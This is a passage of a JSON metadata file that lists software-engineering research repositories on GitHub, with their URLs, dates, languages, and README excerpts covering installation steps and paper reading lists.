                    "value": "https://github.com/DRLDeploymentChallenges-ICSME2023/ReplicationPackage",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-04-28T05:00:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-28T05:00:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "55": {
        "filename": "dcdelia_sniper_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dcdelia/sniper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-01T12:00:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-29T19:54:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 8887720
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 219819
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 61889
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "56": {
        "filename": "lascam-UFU_automatic-diff-dissection_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lascam-UFU/automatic-diff-dissection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-12-02T11:59:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-02T11:35:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 15604603
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 5226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "57": {
        "filename": "JuanGiraldo0212_QPLEX_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JuanGiraldo0212/QPLEX",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-05T20:39:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-22T19:12:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 48671
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "58": {
        "filename": "poclecoqq_quality_issues_in_MLSSs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/poclecoqq/quality_issues_in_MLSSs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-07-21T21:33:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-15T07:07:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 36353
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 21799
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "59": {
        "filename": "codefuse-ai_Awesome-Code-LLM_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/codefuse-ai/Awesome-Code-LLM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "8. **Phi-1.5**: \"Textbooks Are All You Need II: phi-1.5 technical report\" [2023-09] [[paper](https://arxiv.org/abs/2309.05463)] [[model](https://huggingface.co/microsoft/phi-1_5)] \n29. **Tele-FLM**: \"Tele-FLM Technical Report\" [2024-04] [[paper](https://arxiv.org/abs/2404.16645)] [[model](https://huggingface.co/CofeAI/Tele-FLM)] \n",
                    "original_header": "2.1 Base LLMs and Pretraining Strategies"
                },
                "confidence": 0.9297344236848963,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "11. **StarCoder** (FIM): \"StarCoder: may the source be with you!\" [2023-05] [[paper](https://arxiv.org/abs/2305.06161)] [[model](https://huggingface.co/bigcode/starcoder)] \n12. **Phi-1** (CLM): \"Textbooks Are All You Need\" [2023-06] [[paper](https://arxiv.org/abs/2306.11644)] [[model](https://huggingface.co/microsoft/phi-1)] \n16. **CodeShell** (CLM+FIM): \"CodeShell Technical Report\" [2024-03] [[paper](https://arxiv.org/abs/2403.15747)] [[repo](https://github.com/WisdomShell/codeshell)] \n17. **CodeQwen1.5** [2024-04] [[blog](https://qwenlm.github.io/blog/codeqwen1.5/)] \n",
                    "original_header": "Decoder"
                },
                "confidence": 0.9333437905088753,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "16. **CodeFort**: \"CodeFort: Robust Training for Code Generation Models\" [2024-04] [[paper](https://arxiv.org/abs/2405.01567)] \n",
                    "original_header": "2.4 (Instruction) Fine-Tuning on Code"
                },
                "confidence": 0.9159546989495443,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "19. **CIBench**: \"CIBench: Evaluating Your LLMs with a Code Interpreter Plugin\" [2024-07] [[paper](https://arxiv.org/abs/2407.10499)] \n21. **AdaCoder**: \"AdaCoder: Adaptive Prompt Compression for Programmatic Visual Question Answering\" [2024-07] [[paper](https://arxiv.org/abs/2407.19410)] \n",
                    "original_header": "3.1 Coding for Reasoning"
                },
                "confidence": 0.9714235869754264,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. **Self-collaboration**: \"Self-collaboration Code Generation via ChatGPT\" [2023-04] [[paper](https://arxiv.org/abs/2304.07590)] \n",
                    "original_header": "3.3 Code Agents"
                },
                "confidence": 0.9954708676122075,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Requirements are All You Need: From Requirements to Code with LLMs\" [2024-06] [[paper](https://arxiv.org/abs/2406.10101)] \n- \"I Need Help! Evaluating LLM's Ability to Ask for Users' Support: A Case Study on Text-to-SQL Generation\" [2024-07] [[paper](https://arxiv.org/abs/2407.14767)] \n",
                    "original_header": "3.4 Interactive Coding"
                },
                "confidence": 0.9850150887029552,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"WebArena: A Realistic Web Environment for Building Autonomous Agents\" [2023-07] [[paper](https://arxiv.org/abs/2307.13854)] \n",
                    "original_header": "3.5 Frontend Navigation"
                },
                "confidence": 0.9597789749268247,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- [**Fortran, Julia, Matlab, R, Rust**] \"Evaluating AI-generated code for C++, Fortran, Go, Java, Julia, Matlab, Python, R, and Rust\" [2024-05] [[paper](https://arxiv.org/abs/2405.13101)] \n",
                    "original_header": "4. Code LLM for Low-Resource, Low-Level, and Domain-Specific Languages"
                },
                "confidence": 0.9994180768496562,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Comments as Natural Logic Pivots: Improve Code Generation via Comment Perspective\" [2024-04] [ACL 2024 Findings] [[paper](https://arxiv.org/abs/2404.07549)] \n- \"Distilling Algorithmic Reasoning from LLMs via Explaining Solution Programs\" [2024-04] [[paper](https://arxiv.org/abs/2404.08148)] \n- \"Selection of Prompt Engineering Techniques for Code Generation through Predicting Code Complexity\" [2024-09] [[paper](https://arxiv.org/abs/2409.16416)]\n \n",
                    "original_header": "Code Generation"
                },
                "confidence": 0.9477154429907465,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Code Structure Guided Transformer for Source Code Summarization\" [2021-04] [ACM TSEM] [[paper](https://arxiv.org/abs/2104.09340)] \n",
                    "original_header": "Code Commenting and Summarization"
                },
                "confidence": 0.931292311393239,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Enhancing Automated Program Repair through Fine-tuning and Prompt Engineering\" [2023-04] [[paper](https://arxiv.org/abs/2304.07840)] \n",
                    "original_header": "Program Repair"
                },
                "confidence": 0.9181013412104441,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Automatic HTML Code Generation from Mock-Up Images Using Machine Learning Techniques\", 2019-04, EBBT 2019, [[paper](https://ieeexplore.ieee.org/abstract/document/8741736)] \n- \"AUITestAgent: Automatic Requirements Oriented GUI Function Testing\" [2024-07] [[paper](https://arxiv.org/abs/2407.09018)] \n- \"Self-Elicitation of Requirements with Automated GUI Prototyping\" [2024-09] [[paper](https://arxiv.org/abs/2409.16388)] \n",
                    "original_header": "Frontend Development"
                },
                "confidence": 0.9626748763765387,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"EPI-SQL: Enhancing Text-to-SQL Translation with Error-Prevention Instructions\" [2024-04] [[paper](https://arxiv.org/abs/2404.14453)] \n- \"RH-SQL: Refined Schema and Hardness Prompt for Text-to-SQL\" [2024-06] [[paper](https://arxiv.org/abs/2406.09133)] \n- \"E-SQL: Direct Schema Linking via Question Enrichment in Text-to-SQL\" [2024-09] [[paper](https://arxiv.org/abs/2409.16751)]\n \n",
                    "original_header": "Text-To-SQL"
                },
                "confidence": 0.9501945224831748,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Generating Test Scenarios from NL Requirements using Retrieval-Augmented LLMs: An Industrial Study\" [2024-04] [[paper](https://arxiv.org/abs/2404.12772)] \n",
                    "original_header": "Test Generation"
                },
                "confidence": 0.9789369090517381,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"ViC: Virtual Compiler Is All You Need For Assembly Code Search\" [2024-08] [[paper](https://arxiv.org/abs/2408.06385)] \n",
                    "original_header": "Compiler Optimization"
                },
                "confidence": 0.9978775842069905,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"LLMs in Web-Development: Evaluating LLM-Generated PHP code unveiling vulnerabilities and limitations\" [2024-04] [[paper](https://arxiv.org/abs/2404.14459)] \n",
                    "original_header": "Security and Vulnerabilities"
                },
                "confidence": 0.9352361975199797,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"Validating LLM-Generated Programs with Metamorphic Prompt Testing\" [2024-06] [[paper](https://arxiv.org/abs/2406.06864)] \n",
                    "original_header": "Correctness"
                },
                "confidence": 0.9167340930719251,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"On Evaluating the Efficiency of Source Code Generated by LLMs\" [2024-04] [[paper](https://arxiv.org/abs/2404.06041)] \n",
                    "original_header": "Efficiency"
                },
                "confidence": 0.9045594948805429,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \"amplified.dev: a living document that begins to sketch a vision for a future where developers are amplified, not automated\" [2024-05] [[paper](https://amplified.dev)] \n- \"Let the Code LLM Edit Itself When You Edit the Code\" [2024-07] [[paper](https://arxiv.org/abs/2407.03157)] \n- \"Can Developers Prompt? A Controlled Experiment for Code Documentation Generation\" [2024-08] [[paper](https://arxiv.org/abs/2408.00686)] \n",
                    "original_header": "7. User-LLM Interaction"
                },
                "confidence": 0.9389291791542193,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Campus Recruitment**: https://hrrecommend.antgroup.com/guide.html?code=8uoP5mlus5DqQYbE_EnqcE2FD5JZH21MwvMUIb9mb6X3osXPuBraG54SyM8GLn_7 \n**Experienced Hires**: https://talent.antgroup.com/off-campus-position?positionId=1933830 \n**\u6821\u62db**\uff1ahttps://hrrecommend.antgroup.com/guide.html?code=8uoP5mlus5DqQYbE_EnqcE2FD5JZH21MwvMUIb9mb6X3osXPuBraG54SyM8GLn_7 \n**\u793e\u62db**\uff1ahttps://talent.antgroup.com/off-campus-position?positionId=1933830\n \n",
                    "original_header": "Join US"
                },
                "confidence": 0.9775906990539056,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codefuse-ai/Awesome-Code-LLM/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-09-21T06:49:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T12:03:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "60": {
        "filename": "EngineeringSoftware_teco_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EngineeringSoftware/teco",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Ensure that you met the [pre-requisites](#pre-requisites) before proceeding.\n\nThen, you can install a conda environment for TeCo by running the following script, which includes GPU support if GPU is available:\n```\n./prepare-env.sh\n```\n\nAfter this script finishes, you can activate the conda environment by running:\n```\nconda activate teco\n```\nIf this step is successful you should see a `(teco)` prefix in the command line prompt. You may need to reactivate this conda environment every time you open a new terminal.\n\nIf you need to rerun the installation script, make sure the existing conda environment is deactivated by `conda deactivate`.\n\nYou can run the following commands to quickly check if the installation is successful:\n```\n# try if data collection is working\ninv data.collect-raw-data --debug\n\n# try if model training is working (requires first downloading the processed corpus)\ninv data.eval-setup --debug\ninv exp.train-codet5 --setup CSNm-Debug --overwrite --suffix teco-norr --args \"--model.inputs=[fields_notset,last_called_method,types_local,types_absent,similar_stmt_1_0,setup_teardown,focalm,sign,prev_stmts] --model.output=stmt --seed_everything=4197\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "TeCo"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/teco/main/README.md"
            },
            {
                "result": {
                    "value": "TL;DR:\n- If you have an older GPU (e.g., GTX 1080 Ti) and encounter CUDA-related errors, try `./prepare-env.sh 10.2`.\n- If you want to use the system-wide installed CUDA (must be 10.2/11.3/11.6) together with cuDNN and NCCL, do `./prepare-env.sh system`.\n\nTeCo uses PyTorch 1.12.1, which requires CUDA with version 10.2/11.3/11.6, together with cuDNN and NCCL libraries. Our installation script detects whether GPU is available by checking the output of `nvidia-smi`. If GPU is not available, this script will install PyTorch in CPU-only mode, which is usually not suitable for training and evaluating the ML models (unless you know what you're doing), but enables the data collection and processing part of the TeCo to run. If GPU is available, this script will install CUDA 11.6, cuDNN, and NCCL in the conda environment. The installed CUDA is only usable when the conda environment is activated.\n\nYou can change the CUDA version installed by adding an option to the installation script: `./prepare-env.sh cuda_version`, where cuda_version can be cpu, system, 10.2, 11.3, 11.6. Use \"cpu\" if you want to install PyTorch in CPU-only mode even if GPU is available. Use \"system\" if you have already performed a system-wide installation of CUDA (must be one of 10.2/11.3/11.6), together with cuDNN and NCCL, and would like to use it instead of installing another CUDA. The default option \"11.6\" is usually fine especially if you're using a recent GPU, but if you're using an older GPU (e.g., GTX 1080 Ti) and encounter CUDA-related errors, you may want to try \"10.2\" instead.\n",
                    "type": "Text_excerpt",
                    "original_header": "Notes on GPU support and alternative CUDA installation methods",
                    "parent_header": [
                        "TeCo",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/teco/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- The files of the repositories used in our study, archived in case some repositories are removed or renamed. To reproduce the full data collection + model training/evaluation workflow, you need to download all repositories (*large size* - 41GB). To reproduce only the model training/evaluation part, you need to download the repositories in the evaluation set (2GB).\n- Download link for all repositories: https://utexas.box.com/s/n2gjzd4toy5j4t0sv4ztnngezxrx3rhc\n  - Unzip the files (multi-volume zip files) with the following commands: `zip -s 0 downloads.zip --out downloads-single.zip && unzip downloads-single.zip && rm downloads-single.zip`, then move the extracted `downloads` folder to this repository at `_work/downloads`.\n- Download link for repositories in the evaluation set: https://utexas.box.com/s/edmidy4h1plpmoeg5ew1bru3qg6zp8hi\n  - Unzip the downloaded file with `tar xzf downloads.tgz`, then move the extracted `downloads` folder to this repository at `_work/downloads`.\n- Contents:\n  - each repository is stored in a separate folder, with the folder name being the `{user_name}_{repo_name}` (e.g., `apache_fluo` corresponds to github.com/apache/fluo).\n \n",
                    "original_header": "repositories files"
                },
                "confidence": 0.9999998495849354,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/teco/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-24T17:30:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-16T17:59:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 658957
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 255132
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 10527
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "61": {
        "filename": "ezekiel-soremekun_Software-Fairness-Analysis_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ezekiel-soremekun/Software-Fairness-Analysis",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-04-29T12:58:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-29T03:24:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "62": {
        "filename": "dubslaff_FeatCause_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dubslaff/FeatCause",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Since main.py invokes \"./espresso\", please ensure that espresso is in the folder where you run the tool from (e.g., \"tool\"). If on macOS and you want to use the precompiled espresso binary, please rename \"espresso-osx\" to \"espresso\" first. On Windows systems, please compile [espresso](https://github.com/psksvp/espresso-ab-1.0) by your own. \n",
                    "original_header": "tool"
                },
                "confidence": 0.9999257495826075,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dubslaff/FeatCause/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To run our prototype the first argument needs to be the path to the experiment + experiment name, e.g., 'python3 main.py experiment/expFolder/expName ... '. \n",
                    "original_header": "*main.py*"
                },
                "confidence": 0.9781172842074872,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dubslaff/FeatCause/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To execute the runner, espresso has to be located in the same directory as the *evaluation_runner.py*.\n**Make sure to unzip *examples.zip*** before you run the *evaluation_runner.py*.\n \n",
                    "original_header": "benchmark"
                },
                "confidence": 0.9989817827695455,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dubslaff/FeatCause/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Note:** All files have to be stored in the same directory, with the same file name and their respective, correct file extension. If you want conduct more than one experiment for a system,\nyou can add more than one effect set, by increasing the file extension, e.g., _study.1_ would be the second effect set for this system.\nIf you use **CNF** format, you have to specify the option _-fmt CNF_, you have to use the same format for all effect sets and the feature model of one case study.\n \n",
                    "original_header": "Creating own Case-Studies"
                },
                "confidence": 0.9918194006367532,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dubslaff/FeatCause/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-21T15:37:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-22T11:07:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 63839
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "63": {
        "filename": "wangjunjieISCAS_ISTDuplicateDetection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wangjunjieISCAS/ISTDuplicateDetection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-07-22T01:16:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2018-07-22T01:56:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "64": {
        "filename": "SteveKommrusch_VRepair_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/VRepair",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " * Python: 3.9.1\n * Clang: 13.0.0\n * GCC: 10.2.0\n * OpenNMT-py: 1.2.0\n \n",
                    "original_header": "Software versions"
                },
                "confidence": 0.9619758603659467,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SteveKommrusch/VRepair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The trained models are available at:\n* all_VRepair_models_parts.z01  https://zenodo.org/records/10445594 md5:f4029f3f48298b20cf085f3f37d798fd\n* all_VRepair_models_parts.z02  https://zenodo.org/records/10448514 md5:9b74b49484fba0cd72361d81618c6a9f \n* all_VRepair_models_parts.z03  https://zenodo.org/records/10693640 md5:dc05f8b53d947e24b38124fa07d73636\n* all_VRepair_models_parts.z04 https://zenodo.org/records/10694133 md5:ce4ac1a83e2d33e73bf59b7582400466\n* all_VRepair_models_parts.z05 https://zenodo.org/records/10694179 md5:21a2de5969f34113cdbd13b78a1fd2fc\n* all_VRepair_models_parts.zip  https://zenodo.org/records/10695406 md5:82ed7c8bc58c867755e8a2616cf8dd5d \nThe source domain training dataset  for the main approach is available at <https://github.com/ASSERT-KTH/VRepair/releases/download/v20240223/BugFix.tar.bz2> (extracted from the Zenodo package) \n \n",
                    "original_header": "Trained models"
                },
                "confidence": 0.9999882275520158,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SteveKommrusch/VRepair/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-22T10:57:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T15:11:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 834515176
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 96106
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 20044
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 11502
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "65": {
        "filename": "emsejournal_openscience_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/emsejournal/openscience",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-06-28T15:35:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-09T19:14:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "66": {
        "filename": "PrivacyEngineering_tira_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PrivacyEngineering/tira",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Make sure Ruby is installed.\n\n```bash\nruby --version\n```\n\nTIRA was built using Ruby version `2.6.3`, other/newer versions should work fine, but were not tested against.\nUse [rvm](https://rvm.io/) or `rbenv install --verbose 2.6.3`.\n\n\nInstall bundler\n\n```bash\ngem install bundler\n```\n\nClone the repo\n\n```bash\ngit clone https://github.com/PrivacyEngineering/tira.git\ncd tira/\n```\n\nInstall all gems via bundler\n\n```bash\nbundle install\n```\n\nConfigure secrets and credentils \n\n```bash\nbin/rails credentials:edit\n```\n\nRails tries to open the crendentials with `$EDITOR`.\nYou can define an editor by setting the `EDITOR` variable explicitely, e.g.\n\n```bash\nEDITOR=\"nano\" rails credentials:edit\n```\n\n\nThis will create an encrypted config file and a master key, for details visit [this guide](https://edgeguides.rubyonrails.org/security.html#custom-credentials).\nThe configuration format used can be found in the sample configuration file in `config/credentials_example.yml`.\n\nDatabase name and credentials need to be configured.\nIf a different database adapter than postgres is used, this must be configured in:\n\n```\nconfig/database.yml\n```\n\n\nSet up a postgres database (if you chose to not use postgres, set up a database according to your configuration).\n\nYou can use the offical docker image\n\n```bash\ndocker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d postgres\n```\n\nor set up 